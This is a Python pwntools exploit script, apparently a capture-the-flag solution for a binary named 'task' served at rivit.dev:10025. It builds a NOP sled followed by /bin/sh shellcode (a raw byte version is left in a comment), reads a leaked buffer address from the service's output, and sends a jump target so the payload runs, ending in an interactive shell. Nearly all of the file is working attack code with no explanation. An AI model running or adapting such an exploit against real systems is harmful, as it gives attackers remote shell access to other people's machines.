from pwn import *

# Shell code
# shellcode = b"\xeb\x00\xeb\x07\x2f\x62\x69\x6e\x2f\x73\x68\x5e\x31\xc0\x88\x46\x07\xb0\x3b\x31\xdb\x89\xf3\x31\xc9\x31\xd2\xcd\x80"
shellcode = asm(shellcraft.sh())

payload = b"".join(
    [
        b"\x90" * (0x1000 - len(shellcode)),  # NOP sled
        shellcode,  # Shellcode
    ]
)

# Connect to the target process
elf = ELF("./task")
context.log_level = "debug" 
p = remote("rivit.dev", 10025)  # Change to the appropriate host and port

# take the position of buf
raw_output = p.recv()
addr = raw_output.decode("utf-8").split("\n")[0].split(" ")[-1].split("x")[1]
addr = int(addr, 16) + 0x800

p.sendline(payload)
p.recvuntil(b"Where do you want to jump? ")
print(f"Sending address: {hex(addr).encode()}")
p.send(hex(addr).encode()) # jump to the buffer address

p.interactive()